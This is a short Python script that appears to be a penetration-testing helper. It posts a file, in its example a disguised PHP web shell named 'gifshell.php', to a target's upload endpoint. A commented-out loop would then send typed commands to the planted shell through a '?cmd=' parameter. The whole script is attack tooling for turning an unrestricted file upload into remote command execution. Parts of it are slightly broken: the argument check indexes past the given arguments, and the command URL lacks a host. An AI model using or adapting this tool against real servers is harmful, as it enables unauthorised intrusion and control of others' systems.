import requests
import sys

if "help" in sys.argv:
    print("""Usage: python3 upload.py [URL] [filename] [OPTIONAL: parameter for the file upload (default is "file")]
Example: python3 upload.py https://example.com/uploadfile.php gifshell.php
""")
    quit()

url=sys.argv[1]
path_to_shell=sys.argv[2]
param="file"

if len(sys.argv)>2:
    param=sys.argv[3]

#headers={'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundary5tBS5SLzak42PAxi'}
#path_to_shell="/home/elliot/Desktop/myshell.php" #replace this with the path

with open(path_to_shell,'rb') as f:
    files={param:f} #check the params first and confirm that this is alright.
    r=requests.post(url, files=files)
    print(r.text)

"""
while True:
    cmd=input('enter command: ') 
    link=f"?cmd={cmd}" #replace this line accordingly.
    if "upload it" in cmd:
        cmd=cmd.split()
        with open(cmd[2],'rb') as f:
            files={'file':f}
            r=requests.post(url, files=files)
            print(r.text)
            continue
    r=requests.get(link)
"""
